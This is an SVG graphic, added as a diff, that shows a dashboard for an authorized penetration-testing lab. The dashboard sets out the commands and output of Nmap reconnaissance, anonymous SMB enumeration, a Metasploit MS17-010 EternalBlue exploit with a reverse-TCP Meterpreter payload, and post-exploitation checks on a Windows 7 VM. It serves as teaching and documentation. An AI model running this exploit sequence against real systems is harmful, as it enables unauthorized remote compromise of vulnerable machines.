@@ -1,0 +1,142 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 900" role="img" aria-labelledby="title desc">
+  <title id="title">ICE Penetration-Testing Lab command and evidence dashboard</title>
+  <desc id="desc">Authorized Windows 7 lab showing Nmap reconnaissance, SMB enumeration, Metasploit MS17-010 workflow, Meterpreter validation and evidence notes.</desc>
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#03101b"/><stop offset=".55" stop-color="#071d2c"/><stop offset="1" stop-color="#020a12"/></linearGradient>
+    <linearGradient id="panel" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#0b2130"/><stop offset="1" stop-color="#07141f"/></linearGradient>
+    <linearGradient id="accent" x1="0" y1="0" x2="1" y2="0"><stop stop-color="#29d7d1"/><stop offset="1" stop-color="#65f09d"/></linearGradient>
+    <filter id="glow"><feGaussianBlur stdDeviation="7" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <pattern id="grid" width="48" height="48" patternUnits="userSpaceOnUse"><path d="M48 0H0V48" fill="none" stroke="#2aa9c2" stroke-opacity=".055"/></pattern>
+    <style>
+      .ui{font-family:Arial,Helvetica,sans-serif}.mono{font-family:Consolas,Menlo,monospace}.title{font-size:48px;font-weight:800;fill:#f3f8fb}.sub{font-size:18px;fill:#9db1bd}.cap{font-size:13px;font-weight:800;letter-spacing:1.2px;fill:#b7cad4}.term{font-size:14px;fill:#d9e5eb}.green{fill:#61ee91}.cyan{fill:#37d6e6}.muted{fill:#8fa6b2}.small{font-size:12px}.tiny{font-size:10px}.h{font-size:16px;font-weight:800;fill:#f4f8fb}.rule{stroke:#2e5870;stroke-opacity:.72}.check{fill:none;stroke:#53e58d;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
+    </style>
+  </defs>
+  <rect width="1440" height="900" fill="url(#bg)"/>
+  <rect width="1440" height="900" fill="url(#grid)"/>
+  <circle cx="1285" cy="55" r="210" fill="#0bc1c7" opacity=".05"/>
+  <circle cx="180" cy="890" r="280" fill="#34e28a" opacity=".035"/>
+  <g class="ui">
+    <g transform="translate(28 22)">
+      <path d="M44 0 84 23v46L44 92 4 69V23Z" fill="#092434" stroke="#38d9ef" stroke-width="5" filter="url(#glow)"/>
+      <path d="m44 8 31 18-31 18L13 26Z" fill="#d8f4ff"/>
+      <path d="M13 31 40 47v34L13 65Z" fill="#53c8e8"/><path d="m48 47 27-16v34L48 81Z" fill="#1a7297"/>
+    </g>
+    <text x="132" y="67" class="title">ICE Penetration-Testing Lab</text>
+    <text x="134" y="99" class="sub">Authorized penetration testing in a controlled lab environment</text>
+    <g transform="translate(1082 18)">
+      <rect width="330" height="92" rx="14" fill="#061720" stroke="#44df7f" stroke-opacity=".7"/>
+      <path d="M28 23c22 0 31-11 31-11s9 11 31 11v22c0 23-16 36-31 43-15-7-31-20-31-43Z" fill="none" stroke="#51e88b" stroke-width="4"/>
+      <path d="m45 46 9 9 19-21" class="check"/>
+      <text x="108" y="34" class="h green">AUTHORIZED LAB</text>
+      <text x="108" y="59" class="cap">✓ Windows 7 test VM</text>
+      <text x="108" y="79" class="cap">✓ Controlled exercise</text>
+    </g>
+  </g>
+  <g class="ui" transform="translate(28 126)">
+    <g>
+      <rect width="520" height="275" rx="14" fill="url(#panel)" stroke="#315266"/>
+      <rect width="520" height="38" rx="14" fill="#112b3c"/><rect y="28" width="520" height="10" fill="#112b3c"/>
+      <circle cx="477" cy="19" r="5" fill="#34b5ff"/><circle cx="497" cy="19" r="5" fill="#657887"/>
+      <text x="16" y="25" class="cap cyan">01 · NMAP RECONNAISSANCE</text>
+      <g class="mono term">
+        <text x="16" y="62" class="green">kali@ICE-LAB:~$ <tspan fill="#d9e5eb">nmap -sV -Pn 192.168.1.14</tspan></text>
+        <text x="16" y="86">Starting Nmap 7.94 at 2024-05-20 14:22 EDT</text>
+        <text x="16" y="107">Nmap scan report for 192.168.1.14 · Host is up</text>
+        <text x="16" y="134" class="muted">PORT      STATE  SERVICE          VERSION</text>
+        <text x="16" y="157">135/tcp   <tspan class="green">open</tspan>   msrpc            Microsoft Windows RPC</text>
+        <text x="16" y="180">139/tcp   <tspan class="green">open</tspan>   netbios-ssn      Microsoft Windows</text>
+        <text x="16" y="203">445/tcp   <tspan class="green">open</tspan>   microsoft-ds     Windows 7 SMB</text>
+        <text x="16" y="226">3389/tcp  <tspan class="green">open</tspan>   ms-wbt-server    Terminal Services</text>
+        <text x="16" y="254" class="green">Nmap done: 1 host up · 9.18 seconds</text>
+      </g>
+    </g>
+    <g transform="translate(540)">
+      <rect width="500" height="275" rx="14" fill="url(#panel)" stroke="#315266"/>
+      <rect width="500" height="38" rx="14" fill="#112b3c"/><rect y="28" width="500" height="10" fill="#112b3c"/>
+      <circle cx="457" cy="19" r="5" fill="#34b5ff"/><circle cx="477" cy="19" r="5" fill="#657887"/>
+      <text x="16" y="25" class="cap cyan">02 · SMB ENUMERATION</text>
+      <g class="mono term">
+        <text x="16" y="62" class="green">kali@ICE-LAB:~$ <tspan fill="#d9e5eb">smbclient -L //192.168.1.14 -N</tspan></text>
+        <text x="16" y="90" class="green">Anonymous login successful</text>
+        <text x="16" y="120" class="muted">Sharename     Type     Comment</text>
+        <text x="16" y="145">ADMIN$        Disk     Remote Admin</text>
+        <text x="16" y="168">C$            Disk     Default share</text>
+        <text x="16" y="191">IPC$          IPC      Remote IPC</text>
+        <text x="16" y="214">Users         Disk</text>
+        <text x="16" y="237">Shared        Disk</text>
+        <text x="16" y="260" class="green">WORKGROUP → ICE-TEST-VM</text>
+      </g>
+    </g>
+    <g transform="translate(0 293)">
+      <rect width="650" height="340" rx="14" fill="url(#panel)" stroke="#315266"/>
+      <rect width="650" height="38" rx="14" fill="#112b3c"/><rect y="28" width="650" height="10" fill="#112b3c"/>
+      <circle cx="607" cy="19" r="5" fill="#34b5ff"/><circle cx="627" cy="19" r="5" fill="#657887"/>
+      <text x="16" y="25" class="cap cyan">03 · METASPLOIT / MS17-010</text>
+      <g class="mono small term">
+        <text x="16" y="61" class="green">msf6 &gt; <tspan fill="#d9e5eb">search ms17_010</tspan></text>
+        <text x="16" y="84">exploit/windows/smb/ms17_010_eternalblue · Rank: average · Check: Yes</text>
+        <text x="16" y="111" class="green">msf6 &gt; <tspan fill="#d9e5eb">use exploit/windows/smb/ms17_010_eternalblue</tspan></text>
+        <text x="16" y="135" class="green">msf6 exploit(...) &gt; <tspan fill="#d9e5eb">set RHOSTS 192.168.1.14</tspan></text>
+        <text x="16" y="159" class="green">msf6 exploit(...) &gt; <tspan fill="#d9e5eb">set PAYLOAD windows/x64/meterpreter/reverse_tcp</tspan></text>
+        <text x="16" y="183" class="green">msf6 exploit(...) &gt; <tspan fill="#d9e5eb">set LHOST 192.168.1.5</tspan></text>
+        <text x="16" y="207" class="green">msf6 exploit(...) &gt; <tspan fill="#d9e5eb">run</tspan></text>
+        <text x="16" y="235">[*] Connecting to 192.168.1.14:445 for exploitation</text>
+        <text x="16" y="257">[*] Attempting to trigger the vulnerability</text>
+        <text x="16" y="279" class="green">[+] ETERNALBLUE overwrite completed successfully</text>
+        <text x="16" y="301">[*] Sending stage to 192.168.1.14</text>
+        <text x="16" y="324" class="green">[+] Meterpreter session 1 opened · controlled lab</text>
+      </g>
+    </g>
+    <g transform="translate(670 293)">
+      <rect width="370" height="340" rx="14" fill="url(#panel)" stroke="#315266"/>
+      <rect width="370" height="38" rx="14" fill="#112b3c"/><rect y="28" width="370" height="10" fill="#112b3c"/>
+      <circle cx="327" cy="19" r="5" fill="#34b5ff"/><circle cx="347" cy="19" r="5" fill="#657887"/>
+      <text x="16" y="25" class="cap cyan">04 · METERPRETER VALIDATION</text>
+      <g class="mono small term">
+        <text x="16" y="62" class="green">meterpreter &gt; <tspan fill="#d9e5eb">sysinfo</tspan></text>
+        <text x="16" y="88">Computer      : ICE-TEST-VM</text>
+        <text x="16" y="111">OS            : Windows 7 SP1</text>
+        <text x="16" y="134">Architecture  : x64</text>
+        <text x="16" y="157">Domain        : WORKGROUP</text>
+        <text x="16" y="187" class="green">meterpreter &gt; <tspan fill="#d9e5eb">getuid</tspan></text>
+        <text x="16" y="211">Server user   : ICE-TEST-VM$</text>
+        <text x="16" y="241" class="green">meterpreter &gt; <tspan fill="#d9e5eb">ipconfig</tspan></text>
+        <text x="16" y="267">IPv4 Address  : 192.168.1.14</text>
+        <text x="16" y="290">Netmask       : 255.255.255.0</text>
+        <text x="16" y="313">Gateway       : 192.168.1.1</text>
+      </g>
+    </g>
+  </g>
+  <g class="ui" transform="translate(1082 126)">
+    <rect width="330" height="633" rx="14" fill="#071824" stroke="#36637c"/>
+    <text x="22" y="38" class="h">LAB NOTES &amp; EVIDENCE</text><line x1="22" x2="308" y1="54" y2="54" class="rule"/>
+    <text x="22" y="83" class="cap cyan">OBJECTIVE</text>
+    <text x="22" y="106" class="small sub">Enumerate and validate MS17-010</text><text x="22" y="126" class="small sub">on an isolated Windows 7 test VM.</text>
+    <line x1="22" x2="308" y1="145" y2="145" class="rule"/>
+    <text x="22" y="174" class="cap cyan">TARGET</text>
+    <text x="22" y="199" class="small sub">IP: 192.168.1.14</text><text x="22" y="220" class="small sub">OS: Windows 7 Professional x64</text><text x="22" y="241" class="small sub">Host: ICE-TEST-VM</text>
+    <line x1="22" x2="308" y1="260" y2="260" class="rule"/>
+    <text x="22" y="289" class="cap cyan">KEY FINDINGS</text>
+    <g class="small sub"><circle cx="30" cy="318" r="8" fill="none" stroke="#53e58d" stroke-width="2"/><path d="m26 318 3 3 6-7" class="check"/><text x="48" y="323">SMB services open on 139 / 445</text>
+    <circle cx="30" cy="350" r="8" fill="none" stroke="#53e58d" stroke-width="2"/><path d="m26 350 3 3 6-7" class="check"/><text x="48" y="355">Anonymous SMB access allowed</text>
+    <circle cx="30" cy="382" r="8" fill="none" stroke="#53e58d" stroke-width="2"/><path d="m26 382 3 3 6-7" class="check"/><text x="48" y="387">MS17-010 validation succeeded</text>
+    <circle cx="30" cy="414" r="8" fill="none" stroke="#53e58d" stroke-width="2"/><path d="m26 414 3 3 6-7" class="check"/><text x="48" y="419">Meterpreter session confirmed</text></g>
+    <line x1="22" x2="308" y1="440" y2="440" class="rule"/>
+    <text x="22" y="470" class="cap cyan">EVIDENCE CAPTURE</text>
+    <g class="mono small sub"><text x="22" y="497">▣ nmap_scan.txt</text><text x="22" y="521">▣ smb_enum.txt</text><text x="22" y="545">▣ msfconsole_output.txt</text><text x="22" y="569">▣ meterpreter_sysinfo.txt</text><text x="22" y="593">▣ screenshot_ipconfig.png</text></g>
+    <text x="22" y="621" class="tiny muted">Educational use · controlled environment · 2024-05-20</text>
+  </g>
+  <g class="ui" transform="translate(28 786)">
+    <rect width="1012" height="86" rx="14" fill="#081b28" stroke="url(#accent)"/>
+    <g transform="translate(24 18)"><circle cx="24" cy="24" r="20" fill="none" stroke="#36d7e7" stroke-width="2"/><path d="M24 4v40M4 24h40" stroke="#36d7e7"/><text x="58" y="20" class="cap cyan">RECONNAISSANCE</text><text x="58" y="42" class="small sub">Nmap + SMB enumeration</text></g>
+    <path d="M263 43h32m-8-8 8 8-8 8" stroke="#4ddce6" stroke-width="3" fill="none"/>
+    <g transform="translate(315 18)"><circle cx="24" cy="24" r="20" fill="none" stroke="#55e694" stroke-width="2"/><text x="18" y="31" font-size="22" fill="#55e694">✦</text><text x="58" y="20" class="cap green">EXPLOITATION</text><text x="58" y="42" class="small sub">MS17-010 EternalBlue</text></g>
+    <path d="M548 43h32m-8-8 8 8-8 8" stroke="#4ddce6" stroke-width="3" fill="none"/>
+    <g transform="translate(600 18)"><rect x="5" y="5" width="38" height="34" rx="4" fill="none" stroke="#36d7e7" stroke-width="2"/><text x="13" y="29" class="mono cyan">&gt;_</text><text x="58" y="20" class="cap cyan">POST-EXPLOITATION</text><text x="58" y="42" class="small sub">Session checks + evidence</text></g>
+  </g>
+  <g class="ui" transform="translate(1082 786)">
+    <rect width="330" height="86" rx="14" fill="#092519" stroke="#51e88b" filter="url(#glow)"/>
+    <text x="20" y="31" class="cap green">OUTCOME</text>
+    <text x="20" y="55" class="small" fill="#e7f7ec">Authorized workflow documented with</text><text x="20" y="73" class="small" fill="#e7f7ec">commands, findings and captured evidence.</text>
+  </g>
+</svg>
